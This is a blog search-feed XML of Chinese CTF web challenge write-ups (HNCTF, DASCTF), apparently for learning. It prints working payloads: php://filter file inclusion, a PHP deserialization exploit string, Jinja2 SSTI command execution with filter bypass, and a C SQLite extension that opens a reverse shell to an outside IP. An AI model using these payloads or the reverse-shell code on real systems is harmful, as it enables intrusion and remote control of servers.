<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HNCTF（自由赛道）</title>
      <link href="/2022/11/02/HNCTF%EF%BC%88%E8%87%AA%E7%94%B1%E8%B5%9B%E9%81%93%EF%BC%89/"/>
      <url>/2022/11/02/HNCTF%EF%BC%88%E8%87%AA%E7%94%B1%E8%B5%9B%E9%81%93%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Interesting-http"><a href="#Interesting-http" class="headerlink" title="Interesting_http"></a>Interesting_http</h2><p>利用这个包即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">43.143</span>.<span class="number">7.127</span>:<span class="number">28746</span></span><br><span class="line">Content-Length: <span class="number">9</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: http:<span class="comment">//43.143.7.127:28746</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">96.0</span>.<span class="number">4664.45</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Referer: http://43.143.7.127:28746/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: flagisin=.%2Ff14g.php; user=admin</span></span><br><span class="line"><span class="comment">X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">want=flag</span></span><br></pre></td></tr></table></figure><h2 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h2><p>进入题目看见源码发现2048文件<br><img src="https://img-blog.csdnimg.cn/8dffcbe4a25045ea977208d31e8dabf2.png"><br>看见判断条件，直接将这句话放入控制台输出<br><img src="https://img-blog.csdnimg.cn/f4f8720837c04fd3b9e175c90273da3d.png"></p><h2 id="easy-html"><a href="#easy-html" class="headerlink" title="easy_html"></a>easy_html</h2><p>进入题目通过题时进入F14g.php页面中<br>修改长度为20，随便输入得到flag<br><img src="https://img-blog.csdnimg.cn/5a0314b670634e67a9afad578e1769d5.png" alt="在这里插入图片描述"></p><h2 id="Interesting-include"><a href="#Interesting-include" class="headerlink" title="Interesting_include"></a>Interesting_include</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//WEB手要懂得搜索</span></span><br><span class="line"><span class="comment">//flag in ./flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filter&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php伪协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filter=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>得到flag</p><h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p>上传一句话木马</p><h2 id="What-is-Web"><a href="#What-is-Web" class="headerlink" title="What is Web"></a>What is Web</h2><p><img src="https://img-blog.csdnimg.cn/afd47597564a488392b0a84fdfed312b.png"><br>解密得到flag</p><h2 id="easy-include"><a href="#easy-include" class="headerlink" title="easy_include"></a>easy_include</h2><p>日志包含</p><h2 id="Canyource"><a href="#Canyource" class="headerlink" title="Canyource"></a>Canyource</h2><p>无参rce</p><h2 id="easy-unser"><a href="#easy-unser" class="headerlink" title="easy_unser"></a>easy_unser</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;f14g.php&#x27;</span>;</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">body</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$want</span>,<span class="variable">$todonothing</span> = <span class="string">&quot;i can&#x27;t get you want,But you can tell me before I wake up and change my mind&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"><span class="variable">$want</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is created,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$want</span> !== <span class="string">&quot; &quot;</span>) <span class="keyword">$this</span>-&gt;want = <span class="variable">$want</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;want = <span class="keyword">$this</span>-&gt;todonothing;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is unserialized,I will be called&quot;</span>;</span><br><span class="line">        <span class="variable">$but</span> = <span class="string">&quot;I can CHANGE you&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt; want = <span class="variable">$but</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;C1ybaby!&quot;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;I&#x27;m the final function,when the object is destroyed,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;So,let me see if you can get what you want\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;todonothing === <span class="keyword">$this</span>-&gt;want)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;鲍勃,别傻愣着!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;want == <span class="string">&quot;I can CHANGE you&quot;</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You are not you....&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;want == <span class="string">&quot;f14g.php&quot;</span> <span class="keyword">OR</span> is_file(<span class="keyword">$this</span>-&gt;want))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You want my heart?No way!\n&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You got it!&quot;</span>;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;want);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">unserializeorder</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$CORE</span> = <span class="string">&quot;人类最大的敌人,就是无序. Yahi param vaastavikta hai!&lt;BR&gt;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$About_me</span> = <span class="string">&quot;When the object is serialized,I will be called&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;We Come To HNCTF,Enjoy the ser14l1zti0n &lt;BR&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$About_me</span> = <span class="string">&quot;When the object is used as a string,I will be called&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;CORE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$obj</span> = <span class="keyword">new</span> unserializeorder();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="variable">$obj</span> = serialize(<span class="variable">$obj</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ywant&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ywant</span> = @unserialize(@<span class="variable">$_GET</span>[<span class="string">&#x27;ywant&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$ywant</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">body</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$want</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$todonothing</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;want = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;todonothing = <span class="string">&quot;cyxin&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">unserializeorder</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CORE</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">       <span class="keyword">$this</span>-&gt;CORE = <span class="variable">$x</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> body();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> unserializeorder(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">// var_dump($a);</span></span><br><span class="line"><span class="keyword">echo</span>(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//var_dump(unserialize(serialize($b)));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意：<strong>private变量记得加%00</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://43.143.7.127:28039/?ywant=O:16:<span class="string">&quot;unserializeorder&quot;</span>:1:&#123;s:4:<span class="string">&quot;CORE&quot;</span>;O:4:<span class="string">&quot;body&quot;</span>:3:&#123;s:10:<span class="string">&quot;%00body%00want&quot;</span>;s:57:<span class="string">&quot;php://filter/read=convert.base64-encode/resource=f14g.php&quot;</span>;s:17:<span class="string">&quot;%00body%00todonothing&quot;</span>;s:5:<span class="string">&quot;cyxin&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-SSTI"><a href="#ez-SSTI" class="headerlink" title="ez_SSTI"></a>ez_SSTI</h2><p>常规</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://43.143.7.127:28352/?name=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat flag&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="ssssti"><a href="#ssssti" class="headerlink" title="ssssti"></a>ssssti</h2><p>绕过了os，‘，“，_</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).<span class="built_in">eval</span>(request.cookies.x5)&#125;&#125;</span><br><span class="line">Cookie:</span><br><span class="line">x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /f*&#x27;</span>).<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF群友题web</title>
      <link href="/2022/11/02/DASCTF%E7%BE%A4%E5%8F%8B%E9%A2%98web/"/>
      <url>/2022/11/02/DASCTF%E7%BE%A4%E5%8F%8B%E9%A2%98web/</url>
      
        <content type="html"><![CDATA[<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>拿到题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_from_directory</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>])</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&quot;/app/img/&quot;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">8</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">html = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;/upload&quot; method=post enctype=multipart/form-data&gt;</span></span><br><span class="line"><span class="string">         &lt;input type=file name=file&gt;</span></span><br><span class="line"><span class="string">         &lt;input type=submit value=上传文件&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">con = sqlite3.connect(<span class="string">&#x27;:memory:&#x27;</span>,check_same_thread=<span class="literal">False</span>)</span><br><span class="line">cur = con.cursor()</span><br><span class="line">con.enable_load_extension(<span class="literal">True</span>)</span><br><span class="line">cur.execute(<span class="string">&#x27;CREATE TABLE picture (filename char(50))&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span>():</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;/app&#x27;</span>,<span class="string">&#x27;app.py&#x27;</span>,as_attachment=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time())) + secure_filename(file.filename)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">            cur.execute(<span class="string">&quot;insert into picture values (&#x27;&#123;filename&#125;&#x27;)&quot;</span>.<span class="built_in">format</span>(filename=filename))</span><br><span class="line">            con.commit()</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file uploaded in &quot;</span>+app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]+filename</span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_file</span>():</span></span><br><span class="line">    filename = request.args.get(<span class="string">&quot;filename&quot;</span>)</span><br><span class="line">    output = cur.execute(<span class="string">&quot;select * from picture where filename=&#x27;&#123;filename&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(filename=filename)).fetchone()</span><br><span class="line">    <span class="keyword">if</span> output != <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;/app/img&#x27;</span>, output[<span class="number">0</span>], as_attachment=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;file does not exist&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>出现报错，存在sqlite注入<br><img src="https://img-blog.csdnimg.cn/c846c36d7f9f4ec2af3e13d4f7ef04b0.png"><br>同时发现con.enable_load_extension(True)明白可以load_extension加载动态链接库getshell。且测试后可发现load_extension对后缀没有限制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">```c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sqlite3ext.h&gt;</span> <span class="comment">/* Do not use &lt;sqlite3.h&gt;! */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line">SQLITE_EXTENSION_INIT1</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Insert your extension code here */</span></span><br><span class="line"><span class="keyword">int</span> tcp_port = <span class="number">22222</span>;</span><br><span class="line"><span class="keyword">char</span> * ip = <span class="string">&quot;39.96.12.202&quot;</span> ;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32</span></span><br><span class="line">__declspec ( dllexport )</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sqlite3_extension_init</span> <span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function">  sqlite3  * db ,  </span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">char</span>  ** pzErrMsg ,  </span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">const</span> sqlite3_api_routines  * pApi</span></span></span><br><span class="line"><span class="params"><span class="function"> )</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> rc = SQLITE_OK ;</span><br><span class="line">  SQLITE_EXTENSION_INIT2 ( pApi );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> fd ;</span><br><span class="line">  <span class="keyword">if</span> ( fork () &lt;= <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span> ;</span></span><br><span class="line">    addr . sin_family = AF_INET ;</span><br><span class="line">    addr . sin_port = htons ( tcp_port );</span><br><span class="line">    addr . sin_addr . s_addr = inet_addr ( ip );</span><br><span class="line"></span><br><span class="line">    fd = socket ( AF_INET , SOCK_STREAM , <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">if</span> ( connect ( fd , ( struct sockaddr * ) &amp; addr , <span class="keyword">sizeof</span> ( addr )) )&#123;</span><br><span class="line">            <span class="built_in">exit</span> ( <span class="number">0</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dup2 ( fd , <span class="number">0</span> );</span><br><span class="line">    dup2 ( fd , <span class="number">1</span> );</span><br><span class="line">    dup2 ( fd , <span class="number">2</span> );</span><br><span class="line">    execve ( <span class="string">&quot;/bin/bash&quot;</span> , <span class="number">0LL</span> , <span class="number">0LL</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> rc ;</span><br><span class="line">&#125; ``</span><br></pre></td></tr></table></figure><p>然后放到ubuntu里面进行编译，编译前先安装sqlite环境：</p><blockquote><p>sudo apt install libsqlite3-dev</p></blockquote><p>然后编译</p><blockquote><p>gcc -g -fPIC -shared exp.c -o xin.so</p></blockquote><p>上传得到getshell</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow 新手杯web</title>
      <link href="/2022/11/02/ctfshow%20%E6%96%B0%E6%89%8B%E6%9D%AFweb/"/>
      <url>/2022/11/02/ctfshow%20%E6%96%B0%E6%89%8B%E6%9D%AFweb/</url>
      
